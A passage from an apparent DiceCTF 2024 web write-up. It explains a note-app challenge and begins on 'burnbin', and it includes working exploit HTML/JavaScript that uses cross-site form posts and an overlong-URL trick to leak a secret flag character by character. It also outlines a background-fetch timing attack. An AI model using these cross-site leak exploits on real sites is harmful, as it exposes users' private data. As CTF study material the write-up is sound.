punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>browser<span class="token punctuation">)</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>After accessing the URL we provided, the bot visits the <code>/view</code> page. Therefore, we cannot measure the time from the browser this time, but we have to measure it from our local machine. If the idea mentioned earlier is correct, the server response time should be slower.</p><p>But after trying for about three or four hours, I found that it didn’t work.</p><p>There are two reasons for this. First, the server processing speed is too fast. I tested sending 500 requests to localhost, and it took about 400ms to process them. Second, it is difficult to capture the time interval. It is difficult to grasp the time when the bot visits <code>/view</code>.</p><p>In short, I couldn’t find a stable solution after trying for a long time, so I had to give up.</p><p>At this point, I shifted my focus to this part when adding a new note:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> newLen <span class="token operator">=</span> totalLen <span class="token operator">+</span> text<span class="token punctuation">.</span>length<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>newLen <span class="token operator">></span> <span class="token number">16384</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// case 1</span>    <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/?message=Cannot add, please delete some notes first (</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>newLen<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> > 16384 chars)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>userNotes<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>userNotes<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>notes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>id<span class="token punctuation">,</span> userNotes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// case2</span>reply<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/?message=Note added successfully"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>If the note length exceeds 16384, it will be redirected to <code>/?message=Cannot add, please delete some notes first</code>. Otherwise, it will be redirected to <code>/?message=Note added successfully</code>. In other words, if we can detect which one it is redirected to, we can use a similar method to leak the flag.</p><p>I had an idea to guess that the browser should have a limit on the length of the URL. I tried to construct an excessively long URL that would exceed the limit when redirected to <code>/?message=Cannot add, please delete some notes first</code>, but not when redirected to <code>/?message=Note added successfully</code>.</p><p>But the problem is that we cannot control the length of the path. So how can we make the URL longer?</p><p>I tried with the username, for example: <code>http://$&#123;&#39;a&#39;.repeat(1000000)&#125;&#125;:pwd@localhost:3000</code>, and surprisingly, it worked!</p><p>You can see the details in the following PoC:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span>  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>winForm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>inp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/hang'</span><span class="token punctuation">)</span>    win <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'about:blank'</span><span class="token punctuation">,</span> <span class="token string">'winForm'</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> <span class="token constant">TARGET</span> <span class="token operator">=</span> <span class="token string">'http://'</span><span class="token operator">+</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">2097050</span><span class="token punctuation">)</span>  <span class="token operator">+</span> <span class="token string">':def@localhost:3000'</span>    f<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token constant">TARGET</span> <span class="token operator">+</span> <span class="token string">'/create'</span>    inp<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span>    <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/timeout'</span><span class="token operator">+</span>count<span class="token punctuation">)</span>      count<span class="token operator">++</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> r <span class="token operator">=</span> win<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/?r='</span> <span class="token operator">+</span> r<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/err'</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span>        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>When I created a note with a length of only 2, the URL was within the limit, so the new page was opened normally, and accessing <code>win.location.href</code> triggered a cross-origin error.</p><p><img src="/img/dicectf-2024-writeup/p1.png" alt="p1"></p><p>But when I created a note with a length of 20000, the redirected page had a URL that was too long, causing an error, and the newly opened page became <code>about:blank</code>, without triggering an error.</p><p><img src="/img/dicectf-2024-writeup/p2.png" alt="p2"></p><p>Therefore, it is indeed possible to determine whether the note has been successfully created by the length of the URL.</p><p>The final exploit is as follows:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span>  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>winForm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>inp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f_delete</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:3000/remove<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f_create</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:3000/create<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>inp2</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/hang'</span><span class="token punctuation">)</span>    win <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'about:blank'</span><span class="token punctuation">,</span> <span class="token string">'winForm'</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token string">'http://'</span><span class="token operator">+</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">2097050</span><span class="token punctuation">)</span>  <span class="token operator">+</span> <span class="token string">':def@localhost:3000'</span> <span class="token operator">+</span> <span class="token string">'/create'</span>    <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span>    <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/ping_'</span> <span class="token operator">+</span> count<span class="token punctuation">)</span>      count<span class="token operator">++</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>    <span class="token comment">// abcdefghijklmnopqrstuvwxyz</span>    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// step1. create note</span>      <span class="token keyword">let</span> testPayload <span class="token operator">=</span> <span class="token string">'dice&#123;xs'</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_1_start'</span><span class="token punctuation">)</span>      inp2<span class="token punctuation">.</span>value <span class="token operator">=</span> testPayload <span class="token operator">+</span> <span class="token string">'z'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span>      f_create<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_1_end'</span><span class="token punctuation">)</span>      <span class="token comment">// step2. delete first note</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_2_start'</span><span class="token punctuation">)</span>      f_delete<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_2_end'</span><span class="token punctuation">)</span>      <span class="token comment">// step3. leak</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_3_start'</span><span class="token punctuation">)</span>      inp<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span>      f<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_3_end'</span><span class="token punctuation">)</span>      <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span>      <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/timeout'</span><span class="token operator">+</span>count<span class="token punctuation">)</span>        count<span class="token operator">++</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> r <span class="token operator">=</span> win<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href          <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/?r='</span> <span class="token operator">+</span> r<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/err'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// err: payload is before flag</span>        <span class="token comment">// dice&#123;azzz</span>        <span class="token comment">// dice&#123;flag&#125;</span>        <span class="token comment">// about:blank, payload is after flag</span>        <span class="token comment">// dice&#123;flag&#125;</span>        <span class="token comment">// dice&#123;fzzzz&#125;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>By submitting once, you can determine whether the flag’s order is before or after a certain character. By using binary search, you can approximately determine the result after about 6 submissions. Each submission requires a 30-second wait, so it takes a total of 3 minutes. Since I didn’t automate it, I manually leaked the information slowly.</p><p>It took about 40 minutes to obtain the flag, but this was actually unintended.</p><h3><span id="expected-solution">Expected Solution</span></h3><p>Taking note of the expected solution posted by strellic in Discord, it involves using the background fetch API:</p><ol><li>Install a service worker and use the background fetch API.</li><li>This causes the browser to make a special download that resumes on browser start.</li><li>Laxly post CSRF a lot of img tags to purify.js, with a prefix that gets sorted against the flag (see safelist writeup for more details).</li><li>Delete the first post.</li><li>If your post was sorted first, it would be deleted.</li><li>If it was sorted last, it would not be deleted.</li><li>When the browser bot checks &#x2F;view, the browser will take longer to load the page if there are a lot of img tags.</li><li>If it takes longer to load the page, the browser lasts longer and closes later.</li><li>When it closes, the background fetch download stops.</li><li>So, by timing how long your background fetch stays connected to your server, you can leak the outcome of the sort and the flag.</li></ol><h2><span id="webx2fburnbin-1-solve">web&#x2F;burnbin (1 solve)</span></h2><p>First of all, I didn’t solve this challenge and didn’t have time to look into it. The following is written based on the author’s solution.</p><p>This challenge is also similar to a classic note app where you can register a new account and create notes, with the ability to upload an image during creation.</p><p>Let’s start with the bot part:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> puppeteer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"puppeteer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"crypto"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">visit</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> user <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> pass <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> browser<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">headless</span><span class="token operator">:</span> <span class="token string">"new"</span><span class="token punctuation">,</span>            <span class="token literal-property property">pipe</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            <span class="token literal-property property">args</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"--no-sandbox"</span><span class="token punctuation">,</span>                <span class="token string">"--disable-setuid-sandbox"</span><span class="token punctuation">,</span>                <span class="token string">"--js-flags=--noexpose_wasm,--jitless"</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token literal-property property">dumpio</span><span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> context <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">createIncognitoBrowserContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> context<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token string">"http://localhost:3000/register"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">5000</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">'domcontentloaded'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// create new account</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">waitForSelector</span><span class="token punctuation">(</span><span class="token string">"button[type=submit]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"input[placeholder='Username']"</span><span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"input[placeholder='Password']"</span><span class="token punctuation">,</span> pass<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token string">"button[type=submit]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// create paste with flag</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"input[placeholder='Title']"</span><span class="token punctuation">,</span> <span class="token string">"Flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"textarea[placeholder='Paste contents']"</span><span class="token punctuation">,</span> <span class="token string">"Flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> imgUpload <span class="token operator">=</span> <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"input[type=file]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> imgUpload<span class="token punctuation">.</span><span class="token function">uploadFile</span><span class="token punctuation">(</span><span class="token string">"./flag.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token string">"button[type=submit]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// go to exploit page</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">5000</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">'domcontentloaded'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">30_000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        browser <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>browser<span class="token punctuation">)</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> user<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span> visit <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It randomly generates a set of username and password, registers, uploads the flag as an image, and then visits our webpage. So the goal is to steal this image to obtain the flag.</p><p>When displaying the note in the frontend, it uses secure display methods, so it’s not possible to inject HTML, etc. Therefore, we need to find another way, and uploading files seems suspicious:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">fastify<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>    <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">'/api/create'</span><span class="token punctuation">,</span>    <span class="token literal-property 